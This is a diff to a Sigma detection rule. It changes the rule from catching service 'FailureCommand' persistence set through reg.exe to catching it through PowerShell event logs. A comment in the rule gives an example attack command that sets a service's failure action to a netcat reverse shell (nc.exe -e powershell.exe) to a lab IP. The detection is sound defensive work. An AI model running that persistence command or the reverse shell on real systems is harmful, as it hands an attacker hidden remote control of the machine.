@@ -1,4 +1,4 @@
-title: Service abuse with backdoored "command failure" (registry)
+title: Service abuse with backdoored "command failure" (PowerShell)
 description: Detects scenarios where an attacker modify the configuration of a service to trigger an action when the service is crashed.
 references:
 - https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack/tree/master/TA0003-Persistence/T1543.003-Create%20or%20Modify%20System%20Process-Windows%20Service
@@ -12,31 +12,33 @@ author: mdecrevoisier
 status: experimental
 logsource:
   product: windows
-  category: process_creation
-detection:
-  selection_process:
-    EventID: 4688
-    NewProcessName|endswith:
-        - \reg.exe # 'C:\Windows\System32\reg.exe'
-        - \regsvr32.exe
-
-  selection_sysmon_process:
-    EventID: 1
-    Image|endswith:
-        - \reg.exe # 'C:\Windows\System32\reg.exe'
-        - \regsvr32.exe
-
-  selection_command:
-    CommandLine|contains|all: # Full command: REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time" /v FailureCommand /t REG_SZ /d "C:\tmp\pentestlab.exe"
-      - REG ADD
+  service: powershell
+detection: # Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name FailureCommand -value "C:\nc.exe -e powershell.exe 10.10.14.26 4447"
+  selection_powershell_native:
+    EventID: 800
+    EventData|contains|all:
+      - Set-ItemProperty
+      - -path
       - 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\'
-      - /t # Registry entry type
-      - /v # Value to add
       - FailureCommand
-      - /d # Data to add
-      #- /f # Add without prompt
 
-  condition: selection_command and (selection_process or selection_sysmon_process)
+  selection_powershell_modern:
+    EventID: 4103
+    Payload|contains|all:
+      - Set-ItemProperty
+      - -path
+      - 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\'
+      - FailureCommand
+
+  selection_powershell_block:
+    EventID: 4104
+    ScriptBlockText|contains|all:
+      - Set-ItemProperty
+      - -path
+      - 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\'
+      - FailureCommand
+
+  condition: 1 of selection*
 falsepositives:
 - administrator reconfiguring service
 level: high
